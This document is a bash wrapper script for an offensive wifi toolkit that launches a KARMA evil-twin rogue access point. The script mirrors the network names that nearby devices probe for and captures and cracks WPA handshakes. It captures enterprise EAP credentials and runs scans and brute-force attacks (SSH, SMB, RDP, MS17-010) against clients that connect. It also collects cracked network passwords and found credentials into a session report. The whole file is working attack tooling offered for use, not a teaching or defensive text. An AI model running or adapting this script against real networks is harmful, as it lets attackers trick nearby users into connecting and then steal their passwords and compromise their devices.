#!/bin/bash
# KARMA — Evil-twin / rogue-AP attack suite wrapper for F-Security
# Requires wlan1 (secondary WiFi adapter). wlan0 is reserved for management.
set -uo pipefail
FSEC_ROOT="$(cd "$(dirname "$0")/.." && pwd)"
source "$FSEC_ROOT/lib.sh"

banner "KARMA" "Rogue AP · Evil-Twin · Client Attack Suite"

# ── Require wlan1 ──────────────────────────────────────────────────────────
if ! ip link show wlan1 &>/dev/null 2>&1; then
  printf '  %s[!]%s wlan1 not detected.\n' "$RED" "$RESET"
  printf '       KARMA requires a secondary WiFi adapter (wlan1).\n'
  printf '       wlan0 is reserved for management traffic.\n\n'
  exit 1
fi

# ── Pre-flight cleanup — kill zombies from any previous run ────────────────
section "Pre-flight cleanup"
printf '  %s[*]%s Killing stale hostapd / dnsmasq / karma.py ...\n' "$CYAN" "$RESET"
pkill -9 -f "hostapd /tmp/ap_wpa.conf"        2>/dev/null || true
pkill -9 -f "hostapd /tmp/ap_opn.conf"        2>/dev/null || true
pkill -9 -f "hostapd /tmp/ap_wpe.conf"        2>/dev/null || true
pkill -9 -f "hostapd-eaphammer"               2>/dev/null || true
pkill -9 -f "dnsmasq.*dhcp_wlan"              2>/dev/null || true
pkill -9 -f "karma\.py"                        2>/dev/null || true
# Broader fallback — kill ANY hostapd/dnsmasq still holding wlan1
pkill -9 hostapd  2>/dev/null || true
pkill -9 dnsmasq  2>/dev/null || true
sleep 2   # kernel needs time to fully release interface binds after SIGKILL

# Remove stale temp/config/lease files
rm -f /tmp/ap_wpa.conf /tmp/ap_opn.conf /tmp/ap_wpe.conf 2>/dev/null || true
rm -f /tmp/dhcp_wlan1.conf /tmp/dhcp_wlan1.leases        2>/dev/null || true

# Clean stale routing rules left by previous run
ip rule del to 12.0.0.0/24 lookup 1033 2>/dev/null || true
ip rule del to 10.0.0.0/24 lookup 1033 2>/dev/null || true
ip r flush table 1033 2>/dev/null || true

# Reset wlan1: flush IPs, bounce interface, force managed mode
ip addr flush dev wlan1       2>/dev/null || true
ip link set wlan1 down        2>/dev/null || true
iw dev wlan1 set type managed 2>/dev/null || true
ip link set wlan1 up          2>/dev/null || true
sleep 0.5

# Remove any stale monitor vif
for _vif in wlan1mon wlan1mon0; do
  ip link show "$_vif" &>/dev/null 2>&1 && iw dev "$_vif" del 2>/dev/null || true
done

printf '  %s[+]%s Interface reset — ready\n' "$GREEN" "$RESET"

section "Interface detected"
printf '  %s[+]%s wlan1 present — proceeding\n' "$GREEN" "$RESET"

# ── Output directory ────────────────────────────────────────────────────────
# All results go directly into outdir — no subdir — so the app can discover
# every file at depth 2 (results/ts/file) which matches the session regex.
outdir="$(make_outdir)"
export KARMA_OUT="$outdir"

# Advertise this session so pipeline can attach to it
echo "$outdir" > /tmp/karma_running_session

SESSION_START="$(date '+%Y-%m-%d %H:%M:%S')"

{
  printf '# KARMA Attack Session\n'
  printf 'Started   : %s\n' "$SESSION_START"
  printf 'Interface : wlan1\n'
  printf 'Output    : %s\n' "$outdir"
} > "$outdir/karma_session.txt"

# ── Mode selection ──────────────────────────────────────────────────────────
section "Attack mode"
MODE="wpa"
if [[ -n "${SESSION_DIR:-}" ]]; then
  # Pipeline mode: read KARMA_MODE env var set by app (default wpa)
  case "${KARMA_MODE:-wpa}" in
    opn|open) MODE="opn" ;;
    eap|corporate) MODE="eap" ;;
    *) MODE="wpa" ;;
  esac
  printf '  %s[CHAIN]%s Mode: %s%s%s\n\n' "$CYAN" "$RESET" "$CYAN" "${MODE^^}" "$RESET"
else
  printf '  %s[1]%s WPA  — capture/crack WPA handshake, run on_client attacks\n' "$CYAN" "$RESET"
  printf '  %s[2]%s OPN  — open AP, sniff traffic, run on_client attacks\n' "$CYAN" "$RESET"
  printf '  %s[3]%s EAP  — WPE, capture enterprise credentials\n\n' "$CYAN" "$RESET"
  printf '  %s>>%s Mode [1]: ' "$CYAN" "$RESET"
  read -r _mode
  case "${_mode:-1}" in
    2) MODE="opn" ;;
    3) MODE="eap" ;;
    *) MODE="wpa" ;;
  esac
fi

printf '  Mode: %s%s%s\n\n' "$CYAN" "${MODE^^}" "$RESET"
printf 'Mode: %s\n' "${MODE^^}" >> "$outdir/karma_session.txt"

# ── Target SSID ─────────────────────────────────────────────────────────────
section "Target SSID"
TARGET_SSID=""
TARGET_PASS=""
KARMA_ARGS=()
if [[ -n "${SESSION_DIR:-}" ]]; then
  # Pipeline mode: read KARMA_SSID / KARMA_PASS env vars set by app
  TARGET_SSID="${KARMA_SSID:-}"
  TARGET_PASS="${KARMA_PASS:-}"
  if [[ -n "$TARGET_SSID" ]]; then
    KARMA_ARGS=(--essid "$TARGET_SSID")
    printf '  %s[CHAIN]%s Forced SSID : %s%s%s\n\n' "$GREEN" "$RESET" "$CYAN" "$TARGET_SSID" "$RESET"
    printf 'SSID      : %s\n' "$TARGET_SSID" >> "$outdir/karma_session.txt"
  else
    printf '  %s[CHAIN]%s Auto-mirroring probed SSIDs (KARMA mode)\n\n' "$CYAN" "$RESET"
    printf 'SSID      : auto-mirror (KARMA)\n' >> "$outdir/karma_session.txt"
  fi
  if [[ "$MODE" == "wpa" && -n "$TARGET_PASS" ]]; then
    KARMA_ARGS+=(--psk "$TARGET_PASS")
    printf '  %s[CHAIN]%s WPA password : %s(set)%s\n\n' "$GREEN" "$RESET" "$CYAN" "$RESET"
    printf 'Password  : (custom)\n' >> "$outdir/karma_session.txt"
  fi
else
  printf '  %s[ENTER]%s Leave blank → auto-mirror every probed SSID (KARMA)\n' "$DIM" "$RESET"
  printf '  %s[NAME ]%s Type SSID → force one specific network name\n\n' "$DIM" "$RESET"
  printf '  %s>>%s SSID [auto]: ' "$CYAN" "$RESET"
  read -r TARGET_SSID
  if [[ -n "$TARGET_SSID" ]]; then
    KARMA_ARGS=(--essid "$TARGET_SSID")
    printf '  %s[+]%s Forced SSID : %s%s%s\n\n' "$GREEN" "$RESET" "$CYAN" "$TARGET_SSID" "$RESET"
    printf 'SSID      : %s\n' "$TARGET_SSID" >> "$outdir/karma_session.txt"
  else
    printf '  %s[+]%s KARMA auto-mirror mode\n\n' "$GREEN" "$RESET"
    printf 'SSID      : auto-mirror (KARMA)\n' >> "$outdir/karma_session.txt"
  fi
  # Interactive WPA password prompt
  if [[ "$MODE" == "wpa" ]]; then
    printf '  %s[PASS ]%s WPA passphrase (leave blank = auto-generated)\n\n' "$DIM" "$RESET"
    printf '  %s>>%s Password [auto]: ' "$CYAN" "$RESET"
    read -r TARGET_PASS
    if [[ -n "$TARGET_PASS" ]]; then
      KARMA_ARGS+=(--psk "$TARGET_PASS")
      printf '  %s[+]%s WPA passphrase set\n\n' "$GREEN" "$RESET"
      printf 'Password  : (custom)\n' >> "$outdir/karma_session.txt"
    else
      printf '  %s[+]%s WPA passphrase auto-generated\n\n' "$GREEN" "$RESET"
      printf 'Password  : auto\n' >> "$outdir/karma_session.txt"
    fi
  fi
fi

# ── Enable monitor mode on wlan1 ────────────────────────────────────────────
# Strategy: create a SEPARATE monitor vif (wlan1mon) from the same phy,
# while keeping wlan1 alive for AP use (hostapd needs a managed interface).
# airmon-ng RENAMES wlan1 → wlan1mon which destroys the AP interface — avoid it.
section "Monitor mode"
MON_IFACE="wlan1mon"

# Get the phy (physical radio) for wlan1
PHY="$(iw dev wlan1 info 2>/dev/null | awk '/wiphy/{print "phy"$2}')"
if [[ -z "$PHY" ]]; then
  PHY="$(airmon-ng 2>/dev/null | awk '/rt2800usb/{print $1}' | head -1)"
fi

if [[ -n "$PHY" ]]; then
  iw "$PHY" interface add "$MON_IFACE" type monitor 2>/dev/null && \
    ip link set "$MON_IFACE" up 2>/dev/null || MON_IFACE="wlan1"
else
  printf '  %s[!]%s Could not determine phy — using wlan1 for monitor\n' "$RED" "$RESET"
  MON_IFACE="wlan1"
fi

ip link set wlan1 up 2>/dev/null || true

printf '  %s[+]%s Monitor interface : %s\n' "$GREEN" "$RESET" "$MON_IFACE"
printf '  %s[+]%s AP interface      : wlan1\n' "$GREEN" "$RESET"

# ── Locate karma source ─────────────────────────────────────────────────────
KARMA_SRC="$FSEC_ROOT/karma"
if [[ ! -f "$KARMA_SRC/karma.py" ]]; then
  printf '  %s[!]%s karma.py not found at %s\n' "$RED" "$RESET" "$KARMA_SRC"
  exit 1
fi

cd "$KARMA_SRC"

# ── Python dependencies ─────────────────────────────────────────────────────
section "Python dependencies"
_KARMA_DEPS=(scapy mac-vendor-lookup netaddr colorama getkey)
_missing=()
for _dep in "${_KARMA_DEPS[@]}"; do
  python3 -c "import ${_dep//-/_}" 2>/dev/null || _missing+=("$_dep")
done
if [[ ${#_missing[@]} -gt 0 ]]; then
  printf '  %s[*]%s Installing: %s%s\n' "$CYAN" "$RESET" "${_missing[*]}" "$RESET"
  pip3 install --quiet --break-system-packages "${_missing[@]}" 2>/dev/null \
    || pip3 install --quiet "${_missing[@]}" 2>/dev/null \
    || { printf '  %s[!]%s pip3 failed — try: pip3 install %s\n' "$RED" "$RESET" "${_missing[*]}"; exit 1; }
  printf '  %s[+]%s Dependencies installed\n' "$GREEN" "$RESET"
else
  printf '  %s[+]%s All dependencies present\n' "$GREEN" "$RESET"
fi

section "Launching KARMA"
printf '  Results : %s\n' "$outdir"
printf '  Log     : %s/karma.log\n\n' "$outdir"

# ── Background status ticker ────────────────────────────────────────────────
_status_ticker() {
  while true; do
    sleep 30
    _clients=$(iw dev wlan1 station dump 2>/dev/null | grep -c '^Station' 2>/dev/null || true)
    _clients="${_clients//[^0-9]/}"; _clients="${_clients:-0}"
    _procs=""
    for _tool in nmap hydra aircrack medusa routersploit rtsp tcpdump responder; do
      _cnt=$(pgrep -cf "$_tool" 2>/dev/null || true)
      _cnt="${_cnt//[^0-9]/}"; _cnt="${_cnt:-0}"
      [[ "$_cnt" -gt 0 ]] && _procs+="${_tool}(${_cnt}) "
    done
    printf '\n  %s[STATUS]%s Clients: %s | AP: wlan1 (%s) | Active: %s%s\n' \
      "$CYAN" "$RESET" "$_clients" "${MODE^^}" "${_procs:-idle}" "$RESET"
  done
}
_status_ticker &
_TICKER_PID=$!

cleanup() {
  kill "$_TICKER_PID" 2>/dev/null || true
  printf '\n  %s[*]%s KARMA stopped — collecting results…%s\n' "$CYAN" "$RESET" "$RESET"

  # ── Collect any stray outputs scripts wrote to KARMA_SRC instead of KARMA_OUT ──
  find "$KARMA_SRC" -maxdepth 3 \( \
    -name "nmap-*.txt"  -o -name "http_basic-*.txt" -o -name "ingram-*.txt" \
    -o -name "www-*.png" -o -name "www-*.html"      -o -name "rtsp-*.txt"   \
    -o -name "smb-*.txt" -o -name "smb-brute-*.txt" -o -name "ssh-*.txt"    \
    -o -name "rdp-*.png" -o -name "rdp-brute-*.txt" -o -name "ms17010-*.txt" \
    -o -name "ip-forward-*.txt" -o -name "ftp-anon-*.txt" \
    -o -name "telnet-banner-*.txt" -o -name "iot-*.txt" \
    -o -name "*.mpg" -o -name "*.ts" \
  \) 2>/dev/null | while read -r f; do
    cp -f "$f" "$outdir/" 2>/dev/null || true
  done

  # ── Copy .cap/.pcap handshakes ───────────────────────────────────────
  find "$KARMA_SRC/handshakes" \( -name "*.pcap" -o -name "*.cap" \) 2>/dev/null | \
    xargs -I{} cp -f {} "$outdir/" 2>/dev/null || true

  # ── Count findings for summary ───────────────────────────────────────
  _total_clients=$(find "$outdir" -maxdepth 1 -name "nmap-*.txt" 2>/dev/null | wc -l)
  _total_creds=0
  for _cf in "$outdir"/{ssh,smb-brute,rdp-brute,http_basic}-*.txt; do
    [[ -f "$_cf" ]] && grep -c '\[+\].*FOUND\|CRACKED\|SUCCESS' "$_cf" 2>/dev/null | \
      { read n; _total_creds=$((_total_creds + n)); } || true
  done

  # ── Extract SSID/password from cracked handshakes + update summary ───
  {
    printf '\n# Session Summary\n'
    printf 'Ended     : %s\n' "$(date '+%Y-%m-%d %H:%M:%S')"
    printf 'Clients   : %s\n' "$_total_clients"
    printf 'Creds     : %s\n' "$_total_creds"
    printf '\n# Cracked Networks\n'
    _local_found=0
    for _f in handshakes/*.txt; do
      [[ -f "$_f" ]] || continue
      _ssid="$(basename "$_f" .txt)"
      _pass="$(cat "$_f")"
      if [[ -n "$_pass" ]]; then
        _local_found=1
        printf 'SSID: %s  |  Password: %s\n' "$_ssid" "$_pass"
      fi
    done
    [[ $_local_found -eq 0 ]] && printf 'None cracked\n'
    printf '\n# Result files\n'
    ls -1 "$outdir/" 2>/dev/null | grep -v '^karma_session\.txt$\|^karma\.log$' | head -50 | \
      while read -r _fn; do printf '  %s\n' "$_fn"; done
  } >> "$outdir/karma_session.txt"

  # ── Kill all karma child processes ───────────────────────────────────
  pkill -9 -f "hostapd /tmp/ap_wpa.conf"  2>/dev/null || true
  pkill -9 -f "hostapd /tmp/ap_opn.conf"  2>/dev/null || true
  pkill -9 -f "hostapd /tmp/ap_wpe.conf"  2>/dev/null || true
  pkill -9 -f "hostapd-eaphammer"         2>/dev/null || true
  pkill -9 -f "dnsmasq.*dhcp_wlan"        2>/dev/null || true
  pkill -9 -f "karma\.py"                  2>/dev/null || true
  pkill -9 -f "on_client"                 2>/dev/null || true
  pkill -9 -f "on_network"               2>/dev/null || true
  sleep 0.5

  # ── Remove monitor vif ────────────────────────────────────────────────
  iw dev "$MON_IFACE" del 2>/dev/null || true

  # ── Reset wlan1 to clean managed state ───────────────────────────────
  ip addr flush dev wlan1       2>/dev/null || true
  ip link set wlan1 down        2>/dev/null || true
  iw dev wlan1 set type managed 2>/dev/null || true
  ip link set wlan1 up          2>/dev/null || true

  # ── Clean routing rules ───────────────────────────────────────────────
  ip rule del to 12.0.0.0/24 lookup 1033 2>/dev/null || true
  ip rule del to 10.0.0.0/24 lookup 1033 2>/dev/null || true
  ip r flush table 1033 2>/dev/null || true

  # ── Remove temp files ─────────────────────────────────────────────────
  rm -f /tmp/ap_wpa.conf /tmp/ap_opn.conf /tmp/ap_wpe.conf 2>/dev/null || true
  rm -f /tmp/dhcp_wlan1.conf /tmp/dhcp_wlan1.leases        2>/dev/null || true

  # ── Reset PMIC OTG state so phone charges after WiFi adapter unplugged ─
  # OnePlus/Qualcomm SMBLIB bug: hw_detect stays=1 after OTG use → blocks
  # charging on any subsequent USB connect even with a charger.
  # Best-effort: clear hw_detect now and keep clearing it for 15s while
  # user switches cables. Proper fix = USB-C PD cable; reboot = guaranteed fix.
  _HW_DETECT="/sys/class/power_supply/usb/hw_detect"
  if [[ -f "$_HW_DETECT" ]]; then
    echo 0 > "$_HW_DETECT" 2>/dev/null || true
    printf '  %s[*]%s PMIC OTG state reset — plug charger now%s\n' "$CYAN" "$RESET" "$RESET"
    # Background watcher: keep clearing for 15s while user reconnects charger
    (
      for _i in $(seq 1 30); do
        sleep 0.5
        _hw=$(cat "$_HW_DETECT" 2>/dev/null)
        _mode=$(cat /sys/class/power_supply/usb/typec_mode 2>/dev/null)
        # Only fight it back when we see Source attached (charger) — not OTG device
        [[ "$_hw" == "1" && "$_mode" == *"Source attached"* ]] && \
          echo 0 > "$_HW_DETECT" 2>/dev/null || true
      done
    ) &
  fi

  rm -f /tmp/karma_running_session 2>/dev/null || true

  printf '\n  Results saved: %s\n' "$outdir"
  mark_done "$outdir"
}
trap cleanup EXIT INT TERM

# ── Run karma.py ────────────────────────────────────────────────────────────
# Pipeline mode: 500s per SSID. Standalone: 9999s (runs until user stops).
if [[ -n "${SESSION_DIR:-}" ]]; then
  _KARMA_T=500
else
  _KARMA_T=9999
fi
case "$MODE" in
  opn) python3 karma.py -mon "$MON_IFACE" -opn wlan1 -T "$_KARMA_T" "${KARMA_ARGS[@]}" 2>&1 | tee "$outdir/karma.log" ;;
  eap) python3 karma.py -mon "$MON_IFACE" -eap wlan1 -T "$_KARMA_T" "${KARMA_ARGS[@]}" 2>&1 | tee "$outdir/karma.log" ;;
  *)   python3 karma.py -mon "$MON_IFACE" -wpa wlan1 -T "$_KARMA_T" "${KARMA_ARGS[@]}" 2>&1 | tee "$outdir/karma.log" ;;
esac
